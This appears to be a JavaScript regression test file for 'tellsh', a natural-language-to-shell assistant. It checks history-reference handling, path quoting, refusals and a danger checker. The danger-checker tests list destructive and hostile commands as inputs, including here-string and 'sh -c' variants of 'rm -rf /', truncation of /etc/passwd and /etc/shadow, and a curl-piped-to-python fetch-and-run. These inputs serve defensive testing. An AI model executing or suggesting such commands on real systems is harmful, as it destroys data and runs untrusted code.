// Regression tests for round 7: history references read only the single most recent command, and the round-6
// findings (review/r6-claude.md, review/r6-codex.md): quoted paths with spaces keep their boundaries, invalid history
// values and refused references never fall back to `.`, more place references, "its contents", global options of
// git/docker before a listing, "move it there", several paths for one slot, command substitution, danger-checker gaps
// (here-strings, `sh -c … _ /`, truncating system files) and NUL bytes.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { mkdtempSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { suggest } from '../src/pipeline.js';
// the parser on its own (it only raises risk); the trust rule (a non-catalog command is high) is in regressions27.test.js
import { assessCommand as checkDanger } from '../src/danger.js';
import { buildContext, tellshQuery, loadHistory } from '../src/history.js';
import { joinWords } from '../src/shellwords.js';
import { validateComposed } from '../src/compose.js';

const BASH = { shell: 'bash', os: 'linux', coreutils: 'gnu' };
const run = (q, history) => suggest(q, { env: BASH, ...(history ? { history } : {}) });
const BIN = fileURLToPath(new URL('../bin/tellsh.js', import.meta.url));
const cli = (args) => spawnSync(process.execPath, [BIN, ...args], { encoding: 'utf8', env: { ...process.env, NO_COLOR: '1' } });
const refused = (r, ph, why) => {
  assert.equal(r.context.rule, 'refused', `${why}: ${JSON.stringify(r.context)} -> ${r.command}`);
  assert.ok(r.command == null || r.command.includes(ph), `${why}: ${r.command}`);
};

test('only the most recent history line is a reference target', () => {
  // the value two lines back is never used, for reads or changes
  for (const [q, h, ph] of [
    ['delete it', ['cat notes.txt', 'ls'], '<FILE>'],
    ['show it', ['cat notes.txt', 'pwd'], '<'],
    ['logs of that container', ['docker run -d --name web nginx', 'git status'], '<CONTAINER>'],
    ['restart that service', ['systemctl status nginx', 'uptime'], '<SERVICE>'],
    ['delete that branch', ['git checkout -b feature/x', 'git log -n 3'], '<BRANCH>'],
    ['kill it', ['pgrep worker', 'echo done'], '<'],
  ]) {
    const r = run(q, h);
    refused(r, ph, `${q} after ${JSON.stringify(h)}`);
    assert.ok(!/notes|web|nginx|feature|worker/.test(r.command ?? ''), `${q}: ${r.command}`);
  }
  // the previous command itself is used
  assert.equal(run('delete it', ['ls', 'cat notes.txt']).command, 'rm notes.txt');
  assert.equal(run('logs of that container', ['git status', 'docker run -d --name web nginx']).command, 'docker logs --tail 100 -f web');
  // "same for" / "same but" repeat only the previous command
  for (const q of ['same for /var', 'same but only file names', 'to samo dla /var']) {
    const r = run(q, ['du -sh /home', 'ls']);
    assert.equal(r.command, null, q);
    assert.equal(r.context.rule, 'refused', q);
  }
  assert.equal(run('same for /var', ['ls', 'du -sh /home']).command, 'du -sh /var');
  // the context holds one line
  const ctx = buildContext(['cat a.txt', 'docker logs web', 'mkdir /tmp/b']);
  assert.equal(ctx.n, 1);
  assert.deepEqual(ctx.ents, { dir: '/tmp/b' });
  assert.equal(buildContext([]).n, 0);
});

test('the running tellsh call is dropped once, then the previous command is the target', () => {
  assert.equal(run('delete it', ['cat a.txt', 'tellsh --history delete it']).command, 'rm a.txt');
  // the same request run twice: the earlier call is the previous command (and names nothing)
  const r = run('delete it', ['cat a.txt', 'tellsh delete it', 'tellsh delete it']);
  assert.ok(!/a\.txt/.test(r.command ?? ''), r.command);
  // the CLI reads the last two lines only
  const dir = mkdtempSync(join(tmpdir(), 'tellsh-r7-'));
  try {
    const f = join(dir, 'hist');
    writeFileSync(f, 'cat old.txt\nls\ncat new.txt\n');
    assert.deepEqual([...loadHistory({ file: f })], ['ls', 'cat new.txt']);
    const out = cli(['--dry-run', `--history=${f}`, '--shell', 'bash', '--os', 'linux', 'delete', 'it']);
    assert.match(out.stdout, /\$ rm new\.txt/);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('blocker: a quoted path with a space keeps its boundaries (CLI argv and earlier tellsh lines)', () => {
  assert.equal(joinWords(['delete', 'folder', '/tmp/a b']), 'delete folder "/tmp/a b"');
  assert.equal(joinWords(['delete folder /tmp/x']), 'delete folder /tmp/x'); // one argument: the whole request
  assert.equal(joinWords(['x', `a "b" 'c'`]), null);
  const d = cli(['--json', '--shell', 'bash', '--os', 'linux', 'delete', 'folder', '/tmp/a b']);
  assert.equal(JSON.parse(d.stdout).command, "rm -r '/tmp/a b'");
  const f = cli(['--json', '--shell', 'bash', '--os', 'linux', 'delete', 'all', 'log', 'files', 'in', '/tmp/my logs']);
  assert.equal(JSON.parse(f.stdout).command, "find '/tmp/my logs' -type f -iname '*.log' -delete");
  // a whole request in one argument is unchanged
  assert.equal(JSON.parse(cli(['--json', '--shell', 'bash', '--os', 'linux', 'zabij proces na porcie 8080']).stdout).command, 'lsof -ti tcp:8080 -sTCP:LISTEN | xargs -r kill');
  // history: the tellsh line is read with its quoting
  assert.equal(tellshQuery('tellsh show folder "/tmp/my data"'), 'show folder "/tmp/my data"');
  assert.equal(tellshQuery("tellsh --shell bash delete folder '/tmp/a b'"), 'delete folder "/tmp/a b"');
  assert.equal(tellshQuery(`tellsh x "a \\"b\\" 'c'"`), false);
  for (const [h, q, exp] of [
    ['tellsh create folder "/tmp/my data"', 'delete it', "rm -r '/tmp/my data'"],
    ['tellsh delete folder "/tmp/a b"', 'delete it', "rm -r '/tmp/a b'"],
    ['tellsh delete all log files in "/tmp/a b"', 'same for txt', "find '/tmp/a b' -type f -iname '*.txt' -delete"],
  ]) assert.equal(run(q, [h]).command, exp, `${q} after ${h}`);
  // an earlier request that cannot be read back is a refusal, never a guess
  const u = run('delete it', [`tellsh x "a \\"b\\" 'c'"`]);
  refused(u, '<', 'unreadable tellsh line');
});

test('blocker: an invalid history value is a placeholder, never the default `.`', () => {
  const long = '/srv/' + 'segment/'.repeat(32) + 'logs';
  const a = run(`same for ${long}`, ['find /srv/old -type f -iname "*.log" -delete']);
  assert.equal(a.command, "find <PATH> -type f -iname '*.log' -delete");
  assert.ok(a.missing.includes('path'));
  const b = run('same but delete txt files', [`find ${long} -type f -iname "*.log" -delete`]);
  assert.equal(b.command, "find <PATH> -type f -iname '*.txt' -delete");
  assert.equal(b.context.rule, 'refused');
  const c = run('delete it', [`mkdir ${long}`]);
  assert.ok(!/\s\.$/.test(c.command) && c.command.includes('<PATH>'), c.command);
});

test('major: a refused reference never leaves `rm -r .`; a request about entries keeps its intent', () => {
  for (const h of [['ls /var/log'], ['cd /tmp/x; make']]) {
    for (const q of ['delete all log files in this folder', 'delete log files in this folder']) {
      const r = run(q, h);
      refused(r, '<PATH>', `${q} after ${h}`);
      assert.match(r.command, /^find <PATH> /, r.command);
    }
  }
  // without history the request is about the working directory
  assert.equal(run('delete all log files in this folder').command, "find . -type f -iname '*.log' -delete");
});

test('major: other wordings of the previous directory are place references', () => {
  for (const q of ['delete all log files in the previous folder', 'delete all log files in the last directory',
    'delete all log files in the directory I listed', 'usuń pliki log w poprzednim katalogu']) {
    const listed = run(q, ['ls /var/log']);
    refused(listed, '<PATH>', `${q} after ls`);
    assert.ok(!/poprzednim|\s\.\s/.test(listed.command), listed.command);
    const none = run(q);
    assert.ok(none.command.includes('<PATH>') && !/\s\.\s|poprzednim/.test(none.command), `${q}: ${none.command}`);
  }
  assert.equal(run('delete all log files in the previous folder', ['cd /tmp/x']).command, "find /tmp/x -type f -iname '*.log' -delete");
  // a path named next to a place word is withheld, with or without history
  for (const h of [undefined, ['cd /tmp/x']]) assert.equal(run('delete notes.txt there', h).command, 'rm <FILE>');
  // not references
  assert.equal(run('show the last modified files').command.includes('<PATH>'), false);
});

test('major: global options of git/docker do not hide a listing in the line', () => {
  refused(run('delete it', ['cat old.txt; git -C /tmp status']), '<FILE>', 'git -C');
  refused(run('stop it', ['docker logs old; docker --context prod ps']), '<CONTAINER>', 'docker --context');
  refused(run('stop it', ['docker logs old; docker -H tcp://h:2375 ps']), '<CONTAINER>', 'docker -H');
  // the values themselves belong to that context (round 9): see regressions10 'scope-changing global options'
  refused(run('stop it', ['docker --context prod logs web']), '<CONTAINER>', 'docker --context logs');
  refused(run('delete that branch', ['git -C /srv/app merge feature/x']), '<BRANCH>', 'git -C merge');
});

test('minor: "its contents", "what is in it", "usuń jego zawartość" are not the directory', () => {
  for (const q of ['delete its contents', 'delete what is in it', 'usuń jego zawartość', 'remove the contents of it', 'delete its files']) {
    const r = run(q, ['cd /tmp/build']);
    refused(r, '<PATH>', q);
    assert.ok(!(r.command ?? '').includes('/tmp/build'), `${q}: ${r.command}`);
  }
  assert.equal(run('delete it', ['cd /tmp/build']).command, 'rm -r /tmp/build');
});

test('minor: "move it there" names both ends by reference and is refused', () => {
  for (const q of ['move it there', 'move that file there', 'copy it to the previous folder']) {
    const r = run(q, ['cd /tmp/x; cat a.txt']);
    assert.ok(r.command == null || (!/a\.txt|\/tmp\/x/.test(r.command) && r.command.includes('<')), `${q}: ${r.command}`);
  }
  assert.equal(run('copy notes.txt there', ['cd /tmp/x']).command, 'cp -ri notes.txt /tmp/x');
});

test('minor: several paths for one slot and command substitution are placeholders', () => {
  const m = run('delete all log files in "/tmp/x" and "/tmp/y"');
  assert.equal(m.command, "find <PATH> -type f -iname '*.log' -delete");
  assert.ok(m.warnings.some((w) => /more paths/.test(w)), m.warnings.join('; '));
  assert.equal(run('delete all log files in /tmp/x and /tmp/y').command, "find <PATH> -type f -iname '*.log' -delete");
  for (const q of ['delete all log files in `pwd`', 'delete all log files in $(pwd)']) {
    const r = run(q);
    assert.ok(r.command.includes('<PATH>') && !/\bpwd\b/.test(r.command), `${q}: ${r.command}`);
  }
  // unchanged: one path, two-path commands, reads
  assert.equal(run('move /tmp/a.txt to /tmp/b.txt').command, 'mv -i /tmp/a.txt /tmp/b.txt');
  assert.equal(run('delete all log files in /tmp/x').command, "find /tmp/x -type f -iname '*.log' -delete");
});

test('minor: danger checker: here-strings, sh -c with positional arguments, truncating system files', () => {
  for (const c of [`python3 - <<< "import os; os.system('rm -rf /')"`, "bash <<< 'rm -rf /'", `sh -c 'rm -rf "$1"' _ /`,
    `bash -c 'rm -rf $1' x /etc`, 'truncate -s0 /etc/passwd', '> /etc/passwd', 'echo x > /etc/shadow', ': > /boot/grub/grub.cfg']) {
    const d = checkDanger(c);
    assert.equal(d.risk, 'high', c);
    assert.ok(d.critical, `${c}: ${d.warnings.join('; ')}`);
  }
  for (const c of ['python3 <<EOF\nprint(1)\nEOF', 'perl - <<< "print 1"', 'curl -s https://x.example/a.py | python3', 'echo x >> /etc/hosts', 'truncate -s0 app.log']) {
    const d = checkDanger(c);
    assert.equal(d.risk, 'high', c);
    assert.ok(!d.critical, `${c}: ${d.warnings.join('; ')}`);
  }
  // `python3 -m` imports from the working directory first: medium (v0.3 close4)
  assert.equal(checkDanger('cat a.json | python3 -m json.tool').risk, 'medium');
  for (const c of ['grep x <<< "rm -rf /"', 'echo hi 2>/dev/null']) assert.equal(checkDanger(c).risk, 'safe', c);
});

test('minor: a NUL byte never reaches spawnSync', () => {
  for (const q of ['change permissions recursively to 777 on "/tmp/a\0b"', 'list files sorted by size in "/tmp/a\0b"', 'delete it\0']) {
    const r = suggest(q, { env: BASH });
    assert.equal(r.understood, false, q);
    assert.equal(r.command, null);
  }
  assert.equal(validateComposed('ls /tmp/a\0b', 'ls').ok, false);
});
